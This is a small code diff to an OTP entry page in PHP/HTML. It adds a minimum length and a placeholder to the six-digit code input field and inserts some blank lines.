@@ -65,8 +65,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
                 <h2 class="centered">Enter OTP</h2>
                 <p class="text-muted">Enter the code from your email address at: <span class="email-domain">@gmail.com</span></p>
+                
                 <div class="box">
-                    <input class="form-control" type="text" name="code" id="code" maxlength="6">
+                    <input class="form-control" type="text" name="code" id="code" maxlength="6" minlength="6" placeholder="XXXXXX">
                 </div>
                 <div class="button">
                     <input type="submit" value="Continue" class="btn" name="submit">
@@ -76,6 +77,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             </form>
         </div>
     </div>
+
+    
 </body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 <script src="ajax-script.js"></script>
